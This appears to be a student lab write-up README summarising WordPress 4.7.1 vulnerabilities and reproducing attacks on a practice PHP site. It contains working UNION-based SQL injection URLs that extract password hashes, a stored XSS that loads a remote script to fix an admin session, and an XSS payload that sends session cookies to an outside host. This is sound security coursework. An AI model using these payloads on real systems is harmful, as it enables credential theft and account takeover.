# Weeks-7-8-Project-WordPress-vs.-Kali
Time spent: 30 hours spent in total

## SQL Injection:

This is an SQL injection vulnerability in Wordpress version 4.7.1. This vulnerability allows remote hackers to execute arbitrary commands by taking advantage an affected plugin or theme that mishandles a crafted post type name. This vulnerability requires very little knowledge or skill to exploit and is ranked 7.5 on the Common Vulnerability Scoring System. Authentication is not required to exploit the vulnerability. Modification of files and information on the system is possible, but the scope of what the attacker can affect is limited. 

## CRSF:
This is a cross-site request forgery CSRF vulnerability in the widget-editing accesibility-mode feature in Wordpress version 4.7.1. This allows remote hackers to hijack the authentication of unspcified victims for requestst that allow for widget-access action that is related to wp-aadmin/includes/class-wp-screen.php. This vulnerability has a CVSS score of 6.8. This vulnerability allows for limited scope of modification on the attacker’s behalf. Authenticcation is not required to exploit this vulnerability.

Example of this is found at https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733

## DoS:
This vulnerability allows remote attackers to cause a denial of service attack via unspecified vendors due to the oEmbed protocol implementation in the WordPress. This vulnerability existed in Wordpress version 4.5.2 and was secured in the 4.5.3 version. This has a CVSS score of 5.0 and was considered to be a low level of access complexity, meaning that very little knowledge is needed to exploit this. The CWE is not defined for this vulnerability.

## Vulnerability #1: SQL Injection (SQLi)

### Steps to recreate:

- Go to the salespearson page https://104.198.208.81/blue/public/salesperson.php?id=1

- Replace the id parameter with a single quote '. Example: https://104.198.208.81/blue/public/salesperson.php?id='

- After the quote type url encoded SQL command. Example: https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Chashed_password+FROM+users+limit+20+offset+2+--+

- You can interate through the records by changing the LIMIT and OFFSET values

- Some of the example commands:
https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Cdatabase()+--+ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ctable_name+FROM+information_schema.tables+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+ https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ccolumn_name+FROM+information_schema.columns+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+

<img src="https://github.com/Rakesh-Nagaraju/Weeks-7-8-Project-WordPress-vs.-Kali/blob/main/sql_git.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>

## Vulnerability #2: Session Hijacking/Fixation
### Steps to recreate:

- When logged in as an admin go to "Countries, States, & Territories".
- Click on "Show", doesn't matter which country.
- Click on "Add a State".
- Enter values for "Name" and "Code" and click create.
- Click on "Add a Territory".
- Ender a value for "Name".
- In the filed "Position" type:
      <script src="https://bit.ly/2z1UCVh"></script>
- https://bit.ly/2z1UCVh is a shortened link for a js script hosted on GoogeDrive
- Sign in again to the website as an admin
- Now the owner on PHPSESSID hardcoded in js script is logged into the website as an admin
- This is possible because new PHPSESSID is not generated when a used logs into website

<img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_11.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>

## Vulnerability #3: Cross-Site Scripting (XSS)
### Steps to recreate:

- Go to the Contact page.
- In the text area type the following script
  <script>var node = document.createElement('img');
  node.src = "http://192.168.1.2:3000?cookie="+document.cookie;
  document.getElementById("main-content").appendChild(node);</script>
- Submit the form
- When admin checks the feeedback PHPSESSID will be sent to the http://192.168.1.2:3000 address as a GET parameter

<img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_11.gif" width=250> <img src="https://github.com/Rakesh-Nagaraju/FixApp--An-Ios-Movie-Listing-App-/blob/main/gif_Iphone_SE(2ndgen)_part_2.gif" width=250><br>
